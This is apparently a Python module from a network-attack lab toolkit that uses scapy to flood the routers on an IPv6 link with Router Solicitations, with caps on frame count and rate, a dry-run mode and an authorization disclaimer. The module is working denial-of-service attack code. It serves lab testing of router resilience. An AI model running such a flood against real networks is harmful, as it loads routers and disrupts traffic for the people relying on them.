"""Router Solicitation flooding: send a stream of Router Solicitations to load the routers on a link.

A host sends a Router Solicitation (RS) to ask for Router Advertisements. A router that receives one
processes it and may reply, so a stream of RSs costs the router CPU and can crowd out real traffic.

This module sends RSs to the all-routers group at a chosen rate. Each RS carries the operator's MAC in
the Source Link-Layer Address option (RFC 4861), and its IPv6 source is the link-local address derived
from that MAC. The lab measures how many RSs reach the router.

Intended only for networks you own or are explicitly authorized to test.

Run as a module inside the attacker's network namespace:
    ip netns exec atk python -m macabre.attacks.router_solicitation_flooding a1 --source-mac 02:00:00:00:00:30 --frames 500
"""

from __future__ import annotations

import argparse
import sys
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import ICMPv6ND_RS, ICMPv6NDOptSrcLLAddr, IPv6
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import link_local_from_mac

ALL_ROUTERS_MAC = "33:33:00:00:00:02"
ALL_ROUTERS_IP = "ff02::2"
MAX_FRAMES = 1000
MIN_INTERVAL = 0.001
MAX_INTERVAL = 1.0


@dataclass(frozen=True)
class RouterSolicitationFloodingConfig:
    iface: str                          # attacker interface, on the link with the routers
    source_mac: str                     # the MAC in each RS, and the source of its link-local address (required)
    frames: int = 500                   # RSs sent
    interval: float = 0.005             # seconds between RSs
    dry_run: bool = False               # build RSs but do not send them

    def __post_init__(self) -> None:
        if not self.iface:
            raise ValueError("Interface is required.")
        normalize_unicast_mac(self.source_mac)
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Solicitations must be between 1 and {MAX_FRAMES}.")
        if not MIN_INTERVAL <= self.interval <= MAX_INTERVAL:
            raise ValueError(f"Interval must be between {MIN_INTERVAL} and {MAX_INTERVAL} seconds.")


@dataclass
class RouterSolicitationFloodingStats:
    frames: int = 0
    status: str = ""


def build_solicitation(config: RouterSolicitationFloodingConfig) -> Packet:
    """One RS to the all-routers group, with the operator's MAC in the Source Link-Layer Address option."""
    source = normalize_unicast_mac(config.source_mac)
    return (
        Ether(src=source, dst=ALL_ROUTERS_MAC)
        / IPv6(src=link_local_from_mac(source), dst=ALL_ROUTERS_IP, hlim=255)
        / ICMPv6ND_RS()
        / ICMPv6NDOptSrcLLAddr(lladdr=source)
    )


def run_router_solicitation_flooding(
    config: RouterSolicitationFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RouterSolicitationFloodingStats], None],
    send: Callable[..., Any] | None = None,
) -> RouterSolicitationFloodingStats:
    """Send `frames` RSs, `interval` seconds apart, unless `stop_event` is set first."""
    if config.dry_run:
        stats = RouterSolicitationFloodingStats(
            status=(
                f"Dry run: would send {config.frames} Router Solicitation(s) from {config.source_mac} "
                f"to {ALL_ROUTERS_IP}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    send = send or sendp
    stats = RouterSolicitationFloodingStats()
    frame = build_solicitation(config)
    for index in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} solicitation(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        if index < config.frames - 1:
            stop_event.wait(config.interval)
    stats.status = f"Sent {stats.frames} Router Solicitation(s) to {ALL_ROUTERS_IP}."
    return stats


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Flood the routers on a link with Router Solicitations.")
    parser.add_argument("iface")
    parser.add_argument("--source-mac", required=True)
    parser.add_argument("--frames", type=int, default=500)
    parser.add_argument("--interval", type=float, default=0.005)
    args = parser.parse_args(argv)
    config = RouterSolicitationFloodingConfig(
        iface=args.iface, source_mac=args.source_mac, frames=args.frames, interval=args.interval,
    )
    stats = run_router_solicitation_flooding(config, threading.Event(), lambda _s: None)
    print(stats.status, flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
